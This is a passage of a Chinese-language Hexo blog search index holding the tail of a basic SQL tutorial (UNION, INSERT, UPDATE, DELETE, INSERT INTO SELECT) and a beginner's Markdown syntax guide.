operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">&gt;</span>_<span class="token operator">&lt;</span> 我电脑版本好像不支持<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h4><p>UNION：合并两个或多个 SELECT 语句的结果。</p><p><strong>Note：</strong>UNION 内部的每个 SELECT 语句必须拥有<strong>相同数量的列</strong>。列也必须拥有<strong>相似的数据类型</strong>。同时，每个 SELECT 语句中的<strong>列的顺序必须相同</strong>。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#UNION 操作符选取不同的值。如果允许重复的值，则使用UNION ALL；</span><span class="token comment">#UNION 结果集中的列名等于UNION中第一个 SELECT 语句中的列名。</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1<span class="token keyword">UNION</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/19.png" alt="19"></p><h3 id="数据更新语句"><a href="#数据更新语句" class="headerlink" title="数据更新语句"></a>数据更新语句</h3><h4 id="插入：INSERT-INTO语句"><a href="#插入：INSERT-INTO语句" class="headerlink" title="插入：INSERT INTO语句"></a>插入：INSERT INTO语句</h4><p>INSERT INTO：用于向表中插入新记录。</p><p>格式1 ：无需指定要插入数据的列名，只需提供被插入的值即可：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table_name<span class="token keyword">VALUES</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span>value3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>格式2：指定列名及被插入的值：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table_name <span class="token punctuation">(</span>column1<span class="token punctuation">,</span>column2<span class="token punctuation">,</span>column3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token keyword">VALUES</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span>value3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>column为table_name表中的字段；</li></ul><p><img src="/2023/04/03/sql/13.png" alt="13"></p><h4 id="更新：UPDATE语句"><a href="#更新：UPDATE语句" class="headerlink" title="更新：UPDATE语句"></a>更新：UPDATE语句</h4><p>UPDATE：用于更新表中<strong>已存在</strong>的记录。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> table_name<span class="token keyword">SET</span> column1 <span class="token operator">=</span> value1<span class="token punctuation">,</span> column2 <span class="token operator">=</span> value2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>able_name：要修改的表名称；</li><li>column1, column2, …：要修改的字段名称，可以为多个字段；</li><li>value1, value2, …：要修改的值，可以为多个值；</li><li>condition：修改条件，用于指定哪些数据要修改。</li></ul><p><img src="/2023/04/03/sql/14.png" alt="14"></p><p><strong>Note：</strong>update更新数据时，切记不要忘记带where子句，否则你的表中的相应字段的值都会被修改。</p><h4 id="删除：DELETE语句"><a href="#删除：DELETE语句" class="headerlink" title="删除：DELETE语句"></a>删除：DELETE语句</h4><p>DELETE：用于删除表中的行。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>table_name：要删除的表名称;</p></li><li><p>condition：删除条件，用于指定哪些数据要删除。</p></li></ul><p><img src="/2023/04/03/sql/15.png" alt="15"></p><p><strong>Note：</strong></p><ul><li>delete删除数据时，切记不要忘记带where子句，否则你表中的所有记录都会被修改。</li><li>可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：DELETE FROM <em>table_name</em>;</li></ul><h4 id="复制：INSERT-INTO-SELECT"><a href="#复制：INSERT-INTO-SELECT" class="headerlink" title="复制：INSERT INTO SELECT"></a>复制：INSERT INTO SELECT</h4><p>INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个<strong>已存在的表中</strong>。目标表中任何已存在的行都不会受影响。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table2<span class="token punctuation">[</span><span class="token punctuation">(</span>column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token punctuation">[</span>columns_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/20.png" alt="20"></p><h3 id="视图-待写"><a href="#视图-待写" class="headerlink" title="视图(待写)"></a>视图(待写)</h3><h3 id="SQL函数-待写"><a href="#SQL函数-待写" class="headerlink" title="SQL函数(待写)"></a>SQL函数(待写)</h3>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My First Blog</title>
      <link href="/2023/04/02/start-blog/"/>
      <url>/2023/04/02/start-blog/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown-标题"><a href="#Markdown-标题" class="headerlink" title="Markdown 标题"></a>Markdown 标题</h1><p>“#”   =&gt; 一级标题<br>“##” =&gt; 二级标题，以此类推，一共六级标题。</p><h1 id="Markdown文本"><a href="#Markdown文本" class="headerlink" title="Markdown文本"></a>Markdown文本</h1><ul><li>斜体：可以在需要标注为斜体文本前及斜体文本结尾，输入一个星号<code>*</code>或者一个下划线 <code>_</code>；<br>eg：<code>*斜体*</code> ⇒ <em>斜体</em>   <code>_斜体_</code>⇒ <em>斜体</em></li><li>粗体：<code>**</code>或者<code>__</code></li><li>斜粗体：<code>***</code>或者<code>___</code></li></ul><h1 id="Markdown列表"><a href="#Markdown列表" class="headerlink" title="Markdown列表"></a>Markdown列表</h1><p>1）无序列表：使用星号(<code>*</code>)、加号(<code>+</code>)或是减号(<code>-</code>)，再加一个空格作为列表标记；<br>2）有序列表：使用数字并加上 <code>.</code> 号，再加一个空格作为列表标记；<br>note：如果要控制列表的层级，则需要在符号 前使用 <code>tab</code>，如下：</p><ul><li>无序列表 1</li><li>无序列表 2<ul><li>无序列表 2.1</li><li>无序列表 2.2</li></ul></li></ul><h1 id="Markdown链接"><a href="#Markdown链接" class="headerlink" title="Markdown链接"></a>Markdown链接</h1><p>格式：<code>[链接名称](链接地址)</code>或者&lt;链接地址&gt;<br>eg:<a href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">XiaozaYa</a>或者<a href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343</a></p><h1 id="Markdown引用"><a href="#Markdown引用" class="headerlink" title="Markdown引用"></a>Markdown引用</h1><p>格式：在符号 <code>&gt;</code> 后面书写文字，或者加一个空格再加文字；<br>eg：</p><blockquote><p>hello:<br>Welcome</p></blockquote><p>除正常引用外，还可以嵌套，一个 <code>&gt;</code> 符号在第一层，两个 <code>&gt;</code> 符号是第二层，以此类推，如下：</p><blockquote><p>这是一个引用:</p><blockquote><p>welcome</p><blockquote><p>快来玩啊！</p></blockquote></blockquote></blockquote><h1 id="Markdown分割线"><a href="#Markdown分割线" class="headerlink" title="Markdown分割线"></a>Markdown分割线</h1><h2 id="格式：在一行中用三个-或者-来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg-Welcome-我爱你！"><a href="#格式：在一行中用三个-或者-来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg-Welcome-我爱你！" class="headerlink" title="格式：在一行中用三个 - 或者 * 来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg:Welcome!***我爱你！"></a>格式：在一行中用三个 <code>-</code> 或者 <code>*</code> 来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用<code>-</code>时就会变成放大上面的字；<br>eg:<br>Welcome!<br>***<br>我爱你！</h2><hr><hr><h1 id="Markdown删除线"><a href="#Markdown删除线" class="headerlink" title="Markdown删除线"></a>Markdown删除线</h1><p>格式：在需要删除的文字前后各使用两个 <code>~</code>；<br>eg：<br><del>删除线</del></p><h1 id="Markdown下划线"><a href="#Markdown下划线" class="headerlink" title="Markdown下划线"></a>Markdown下划线</h1><p>格式：在需要添加下划线的文字首部和尾部加上 <code>&lt;u&gt;文本&lt;/u&gt;</code>；<br>eg：<br><u>下划线</u></p><h1 id="Markdown表格"><a href="#Markdown表格" class="headerlink" title="Markdown表格"></a>Markdown表格</h1><p>格式：表格使用 <code>|</code> 来分隔不同的单元格，使用 <code>-</code> 来分隔表头和其他行，如果想调整表格的左对齐、右对齐、居中对齐:</p><ul><li><code>:-</code>：将表头及单元格的内容左对齐；</li><li><code>-:</code>：将表头及单元格的内容左对齐；</li><li><code>:-:</code>：将表头及单元格的内容居中对齐；<br>eg：<br>|姓名|年龄|工作|<br>| :—– | :–: | ——-:|<br>| 小可爱 |  18  | 吃可爱多  |<br>| 小小勇敢 |  20  | 爬棵勇敢树  |<br>| 小小小机智 |  22  | 看一本机智书 |</li></ul><p>|姓名|年龄|工作|<br>| :—– | :–: | ——-:|<br>| 小可爱 |  18  | 吃可爱多  |<br>| 小小勇敢 |  20  | 爬棵勇敢树  |<br>| 小小小机智 |  22  | 看一本机智书 |</p><h1 id="Markdown图片"><a href="#Markdown图片" class="headerlink" title="Markdown图片"></a>Markdown图片</h1><p>格式：<code>![图片描述](图片地址)</code><br>note：</p><ul><li>如果是行内图片则无图例，否则有图例；</li><li>仅支持 https 的图片，图片粘贴到网页编辑器后，会自动上传到服务器；如果是本地编辑器，需要有一个相对路径用来存储保存的图片。</li><li>支持 <code>jpg、png、gif、svg</code> 等图片格式，<strong>其中 svg 文件仅可在微信公众平台中使用</strong>。<br><img src="http://image.luokangyuan.com/4027734.jpeg" alt="图片:【heihei】"></li></ul><h1 id="Markdown脚注"><a href="#Markdown脚注" class="headerlink" title="Markdown脚注"></a>Markdown脚注</h1><p>格式：<code>[文字](脚注解释 "脚注名字")</code><br>eg：<br>脚注：<a href="%E8%84%9A%E6%B3%A8%E8%A7%A3%E9%87%8A" title="脚注名字">文字</a></p><h1 id="Markdown代码块"><a href="#Markdown代码块" class="headerlink" title="Markdown代码块"></a>Markdown代码块</h1><p>格式：如果在一个行内需要引用代码，只要用反引号引起来就好；<br>eg：Use the <code>printf()</code> function.</p><ul><li>如果是在一个块内需要引用代码，则在需要高亮的代码块的前一行及后一行使用三个反引号，同时 <strong>第一行反引号后面表示代码块所使用的语言</strong>，如下：<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;int main(){printf("Hello World\n");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
